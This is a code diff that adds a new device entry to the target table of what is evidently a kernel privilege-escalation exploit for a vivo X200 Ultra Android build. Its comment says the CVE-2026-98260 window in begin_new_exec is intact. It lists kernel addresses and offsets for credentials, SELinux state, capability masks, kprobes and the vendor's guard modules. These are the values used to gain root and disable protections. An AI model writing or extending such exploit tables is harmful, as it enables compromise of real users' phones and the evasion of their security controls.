@@ -156,6 +156,61 @@ static const struct target g_targets[] = {
         .kptr_restrict_static = 0xffffffc08215baf8ULL,
     },
     {
+        /*
+         * 6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k
+         * vivo X200 Ultra (PD2454) OriginOS 7, 17.2.11.5.W10.V000L1
+         * (SPL follow-up to 17.2.10.6, kernel build abogki567717946).
+         *
+         * Constants verified 2026-11-12 from the build's Image
+         * (vmlinux-to-elf kallsyms + disasm):
+         *   - ALL data statics sit at the SAME addresses as the
+         *     g3b723d0e8507 build (selinux_state, panic_on_warn,
+         *     modules_disabled, kprobes_all_disarmed, kptr_restrict,
+         *     root_user, init_* , __tracepoint_sys_exit) — data layout
+         *     unchanged, so every layout constant carries over;
+         *   - the guard modules vr.ko and hooks_defend.ko differ from
+         *     17.2.10.6 ONLY in .modinfo (vermagic/scmversion) and
+         *     .note.gnu.build-id — executable code, data, relocations
+         *     and __versions byte-identical, so both guard maps below
+         *     carry over unchanged;
+         *   - do_timer_create moved +0x1c: bl kmem_cache_alloc at
+         *     0xffffffc080197ffc, trace call_site (return) +4 ->
+         *     0xffffffc080198000 (low21 0x198000);
+         *   - copy_process unchanged -> low21 0xac790;
+         *   - begin_new_exec (0xffffffc0803d77d4) keeps the vulnerable
+         *     de_thread-before-fallible-ops call order with
+         *     posix_cpu_timers_exit/exit_itimers AFTER them — the
+         *     CVE-2026-98260 window is intact; exit_itimers is
+         *     byte-identical to the g3b723d0e8507 build.
+         */
+        .prefix = "6.6.127-android15-8-gd489d4ad2a70",
+        .static_timer_site = 0xffffffc080198000ULL,
+        .timer_site_low21 = 0x198000ULL,
+        .selinux_state_static = 0xffffffc08239a170ULL,
+        .panic_on_warn_static = 0xffffffc08214ac0cULL,
+        .copy_process_low21 = 0xac790ULL,
+        .root_user_static = 0xffffffc08216f108ULL,
+        .init_user_ns_static = 0xffffffc08216ee78ULL,
+        .init_ucounts_static = 0xffffffc082170bd8ULL,
+        .init_groups_static = 0xffffffc082170668ULL,
+        .tp_sys_exit_static = 0xffffffc0822f3760ULL,
+        .timer_alloc = 0x108ULL,
+        .cred_req = 0xb8ULL,
+        .cred_alloc = 0xc0ULL,
+        .cred_uid_off = 0x8ULL,
+        .off_task_cred = 0x820ULL,
+        .task_alloc_bytes = 0x12c0ULL,
+        .fullcap = 0x1ffffffffffULL,
+        .selinux_blob_off = 0x0ULL,
+        .selinux_sid_kernel = 1U,
+        .vr_tag_a_off = 0x06ULL,
+        .vr_tag_b_off = 0x2cULL,
+        .tracepoint_funcs_off = 0x48ULL,
+        .modules_disabled_static = 0xffffffc08237b800ULL,
+        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
+        .kptr_restrict_static = 0xffffffc08215baf8ULL,
+    },
+    {
         .prefix = "6.6.127-android15-8-ga8e7fdfdc746",
         .static_timer_site = 0xffffffc080195bb4ULL,
         .timer_site_low21 = 0x195bb4ULL,
